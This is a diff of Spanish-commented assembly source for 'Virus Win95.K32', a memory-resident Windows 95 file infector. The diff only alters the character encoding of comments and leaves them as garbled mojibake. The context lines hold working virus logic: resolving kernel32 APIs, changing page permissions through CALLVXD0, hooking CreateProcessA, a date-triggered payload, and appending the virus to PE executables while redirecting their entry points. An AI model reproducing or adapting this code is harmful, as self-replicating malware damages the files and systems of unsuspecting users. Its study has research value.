@@ -6,19 +6,19 @@
 ;
 ;  Virus residente, pa win95
 ;  Uso el espacio libre dejado por el header del kernel32
-;    dentro de la primera p gina.
+;    dentro de la primera pÂ gina.
 ;  Parcheo el API CreateProcessA mediante un JMP
-;  Modifico los permisos de las p ginas que voy a utilizar
+;  Modifico los permisos de las pÂ ginas que voy a utilizar
 ;    mediante una llamada a CALLVXD0 (_PageModifyPermissions)
 ;    Vxd 01 servicio 0d.
 ;  Hallo la direccion de las apis a utilizar buscando en la
-;    export table del kernel32 , supongo la direcci¢n base del
-;    kernel32.dll como 0bff70000h . La unica comprobaci¢n que hago
+;    export table del kernel32 , supongo la direcciÂ¢n base del
+;    kernel32.dll como 0bff70000h . La unica comprobaciÂ¢n que hago
 ;    al respecto es mirar en la pila [sp+3]=0b7h, con lo que 
 ;    por lo menos si no es 0bff70000h se acerca :)
-;  Infecto aumentando la ultima secci¢n del file y modifico el
-;    entrypoint del file, pero no modifico los atributos de la £ltima
-;    secci¢n aunque estos sean de solo lectura ,paso completamente de esos
+;  Infecto aumentando la ultima secciÂ¢n del file y modifico el
+;    entrypoint del file, pero no modifico los atributos de la Â£ltima
+;    secciÂ¢n aunque estos sean de solo lectura ,paso completamente de esos
 ;    atributos y luego mientras se ejecuta el virus este se pone los
 ;    atributos de pagina que quiera mediante el servicio
 ;     _PageModifyPermissions.
@@ -32,10 +32,10 @@ include win32.inc
 
 extrn      ExitProcess:PROC
 extrn      MessageBoxA:PROC        ;apis exportadas unicamente en la primera
-extrn      CreateProcessA:proc     ;generaci¢n
+extrn      CreateProcessA:proc     ;generaciÂ¢n
 
 
-;*********** Aqu¡ algunas equs interesantes ****************
+;*********** AquÂ¡ algunas equs interesantes ****************
 
 viriisize  equ  (((offset end - offset start)+064h)/065h)*065h
 K32        equ  0bff70000h
@@ -48,7 +48,7 @@ OPEN_EXISTING   EQU     3          ;usado por CreateFile para abrir archivo exis
 
 .data
 
-dummy    db    0                         ;de esta secci¢n paso
+dummy    db    0                         ;de esta secciÂ¢n paso
 mess     db    'nIgrO rUlez!!!$',0
 text     db    'Virus Win95.K32 .... Ejecutado',0
 
@@ -84,7 +84,7 @@ Lajodimos:
 
 startvirii:
           cmp    byte ptr [esp+3],0bfh    ;verifico que se llama desde el
-          jne    malasunto                ;la direcci¢n bf??????h
+          jne    malasunto                ;la direcciÂ¢n bf??????h
 
           pushad                     ;pusheo tooo
           push  ebp
@@ -106,7 +106,7 @@ codigoparcheado:
 FIRMA          db   'Virus K32 por nIgr0  ... "Hazlo o no lo hagas pero no lo intentes"',0
 NLH            db   'nIgr0_lives_here!!!!',0
 IOBYTES        dd    0h,0h
-llamada        dd    0bff713d4h         ;direcci¢n de CallVXD0 hallada anteriormente
+llamada        dd    0bff713d4h         ;direcciÂ¢n de CallVXD0 hallada anteriormente
 hoste          db   'c:\virus\k32\K.EXE',0,'                                     '
 
 ahand dd 0                   ; handle del virus que abro
@@ -147,7 +147,7 @@ peheader:                ; Estructura del Pe header
 addresstable dd 00h        ;direccion de la addresstable en la export table
 nametable    dd 00h        ;direccion la tabla de punteros a strings (de la export table)
 ordinaltable dd 00h        ;puntero a la ordinal table
-contador     dd 00h        ;pa calcular la posici¢n del puntero en la nametable que
+contador     dd 00h        ;pa calcular la posiciÂ¢n del puntero en la nametable que
                            ;que apunte a la api buscada.
 apiabuscar   dd 00h        ;offset donde se encuentra la string de la api a
                            ;buscar (es usada temporalmente por mi
@@ -163,7 +163,7 @@ nombreapis:
                   dd 014d
                   db 'SetFilePointer',0,'  '      ;voy a utilizar
                   dd 08d
-                  db 'ReadFile',0,'        '      ;junto con el tama¤o de la
+                  db 'ReadFile',0,'        '      ;junto con el tamaÂ¤o de la
                   dd 09d
                   db 'WriteFile',0,'       '      ;string
                   dd 011d
@@ -176,7 +176,7 @@ nombreapis:
                   db 'GetProcAddress',0,'  '
 direccionesapis:
 
-newCreateFile       dd 00h  ;0bff7799ch      ;valores para mi versi¢n de WIN :)
+newCreateFile       dd 00h  ;0bff7799ch      ;valores para mi versiÂ¢n de WIN :)
 newSetFilePointer   dd 00h  ;0bff770e4h
 newReadFile         dd 00h  ;0bff7594ah
 newWriteFile        dd 00h  ;0bff75951h
@@ -198,9 +198,9 @@ saltito:
 
        xor     eax,eax            ;empiezo a calcular la direccion de CALLVXD0
        mov     esi,K32 + 3CH
-       lodsw                      ;en ax me quedar  el comienzo del PE header
+       lodsw                      ;en ax me quedarÂ  el comienzo del PE header
 
-       add     eax,K32            ;a la que le suma la direcci¢n base del Kernel32
+       add     eax,K32            ;a la que le suma la direcciÂ¢n base del Kernel32
 
 
        cmp     dword ptr [EAX],00004550H       ;verifico que es un PE header
@@ -210,18 +210,18 @@ ERROR: jmp    melaspiro
 
 
 NoERROR:
-       mov     esi,[EAX + 78H]         ; 78H = la direcci¢n a la export table
+       mov     esi,[EAX + 78H]         ; 78H = la direcciÂ¢n a la export table
        add     esi,K32 + 1CH           ; 1CH RVA para la adress table
 
     
        lodsd                           ; en eax queda la RVA al primer ordinal
-       add     eax,K32                 ; es decir la direcci¢n a la CALLVXD0
+       add     eax,K32                 ; es decir la direcciÂ¢n a la CALLVXD0
 
        push    eax                     ;
        pop     esi                     ;en esi=eax
 
        lodsd                           ;obtengo la RVA de la primera API
-       add     eax,K32                 ;EAX = La direcci¢n de la primera API
+       add     eax,K32                 ;EAX = La direcciÂ¢n de la primera API
 
 
        mov   edi,ebx
@@ -242,9 +242,9 @@ NoERROR:
        pop    eax
 continuar:
 
-       mov     [ebp+llamada],eax           ;salvo la direcci¢n de CALLVXD0
+       mov     [ebp+llamada],eax           ;salvo la direcciÂ¢n de CALLVXD0
 
-       mov  eax,0bff70400h                 ;verifico que no est  residente 
+       mov  eax,0bff70400h                 ;verifico que no estÂ  residente 
        mov  ebx,dword ptr [eax]
        cmp  ebx,dword ptr [ebp+startvirii]
        je   yaresidente
@@ -273,7 +273,7 @@ otraapi:                               ;obtengo la direccion de las apis
       call  INT_21                ;compruebo la fecha del sistema
 
       cmp   dh,02d
-      jne   nopayload            ;fecha de activaci¢n 19d de febrero
+      jne   nopayload            ;fecha de activaciÂ¢n 19d de febrero
       cmp   dl,019d
       jne   nopayload
 
@@ -304,7 +304,7 @@ nopayload:
        ror   edi,012d
        call  desprotegerpagina       ;desprotejo 2 paginas una para poder
                                      ;parchear el api y otra en la que
-                                     ;quedar‚ residente
+                                     ;quedarÂ‚ residente
        inc    edi
        call  desprotegerpagina      ;y la siguiente 
 
@@ -343,7 +343,7 @@ enddata:
 desprotegerpagina:                             ; LLamada a CALLVXD0
        mov     eax,dword ptr [ ebp + offset llamada]
 modificarpermisos:
-       push    020060000h    ;nuevos atributos de p gina
+       push    020060000h    ;nuevos atributos de pÂ gina
        push    00h
        push    01h
        push    edi
@@ -373,11 +373,11 @@ GetAddressApi:
         xor     eax,eax
         mov     dword ptr [ebp+contador],eax    ;pongo a cero el valor del contador
         mov     esi,K32 + 3CH
-        lodsw                      ;en ax me quedar  el comienzo del PE header
+        lodsw                      ;en ax me quedarÂ  el comienzo del PE header
 
-        add     eax,K32            ;a la que le suma la direcci¢n base del Kernel32
+        add     eax,K32            ;a la que le suma la direcciÂ¢n base del Kernel32
 
-        mov     esi,[EAX + 78H]         ; 78H = la direcci¢n a la export table
+        mov     esi,[EAX + 78H]         ; 78H = la direcciÂ¢n a la export table
         add     esi,K32 + 1cH           ; 1CH RVA para la adress table
 
     
@@ -458,11 +458,11 @@ otrocar:   cmp  byte ptr [esi],0      ;copio la cadena de texto con el nombre
            je   sacabo                ;de la victima en la variable hoste
            movsb
            jmp otrocar
-sacabo:    movsb        ;copio el 0 tambi‚n
+sacabo:    movsb        ;copio el 0 tambiÂ‚n
 
            lea  esi,ebp+hoste
            cmp  byte ptr [esi],022h
-           jne   proseguir                ;rehago el string por si est 
+           jne   proseguir                ;rehago el string por si estÂ 
                                           ;entre comillas
            lea  edi,ebp+hoste
            inc  esi
@@ -497,12 +497,12 @@ esunexe:
         mov dword ptr [ebp + offset ahand],eax   ; Guardo el handle
 
 
-        ; Busco el comienzo del PE header que est  en la posici¢n 3ch
+        ; Busco el comienzo del PE header que estÂ  en la posiciÂ¢n 3ch
 
         mov     edx,03ch
         call    moverpuntero
 
-           ; Leo la posici¢n del Pe header
+           ; Leo la posiciÂ¢n del Pe header
 
         mov  ecx,004h
         lea  edx,[ebp + offset peheaderoffset]
@@ -514,7 +514,7 @@ esunexe:
         call    moverpuntero
 
          
-           ; Leo un poco del header para calcular todo el tama¤o del
+           ; Leo un poco del header para calcular todo el tamaÂ¤o del
            ; pe header y object table
 
         mov ecx,058h
@@ -532,10 +532,10 @@ esunexe:
       
 
 
-      ; Me aseguro que es un pe y que no est  infectado
+      ; Me aseguro que es un pe y que no estÂ  infectado
       cmp dword ptr [ebp + offset peheader],00004550h    ; PE,0,0
       jnz notape
-      cmp word ptr [ebp + offset peheader + 4ch],00badh ;si est  infectado salir
+      cmp word ptr [ebp + offset peheader + 4ch],00badh ;si estÂ  infectado salir
       jz notape
 
 
@@ -552,7 +552,7 @@ esunexe:
      ;relativo al comienzo del Pe header
 
         
-     ;Calculo el Offset del £ltimo  objecto de la tabla
+     ;Calculo el Offset del Â£ltimo  objecto de la tabla
       mov esi,dword ptr [ebp + offset ObjectTableoffset]
       lea eax,[ebp + offset peheader]
       add esi,eax
@@ -577,7 +577,7 @@ esunexe:
          mov dword ptr [ebp + offset ultfisicalsize],eax
          mov dword ptr [ebp + offset secphy],eax
 
-         ; Calcula el tama¤o fisico pa el ultimo object
+         ; Calcula el tamaÂ¤o fisico pa el ultimo object
          mov ecx,dword ptr [ebp + offset filealign]
          mov eax,dword ptr [ebp + offset physicalsize]
          add eax,viriisize
@@ -588,11 +588,11 @@ esunexe:
          mov dword ptr [ebp + offset physicalsize],eax
 
          mov eax,dword ptr [ebp + offset virtualsize]
-         mov dword ptr [ebp+ offset secdesplaza],eax ;el tama¤o virtual ser 
-                                                     ;el desplazamiento dentro de la secci¢n
+         mov dword ptr [ebp+ offset secdesplaza],eax ;el tamaÂ¤o virtual serÂ 
+                                                     ;el desplazamiento dentro de la secciÂ¢n
                     ;RVA del objeto + desplazamiento virtual= entrypoint RVA   
 
-         ; calcula el tama¤o virtual del objeto modificado
+         ; calcula el tamaÂ¤o virtual del objeto modificado
          mov ecx,dword ptr [ebp + offset objalign]
          mov eax,dword ptr [ebp + offset virtualsize]
          add eax,viriisize
@@ -651,7 +651,7 @@ esunexe:
         call moverpuntero
 
 
-        ; Copio el virus al final (de la ultima secci¢n)
+        ; Copio el virus al final (de la ultima secciÂ¢n)
         mov ecx,viriisize
         lea edx,[ebp + offset startvirii]
         call escritura
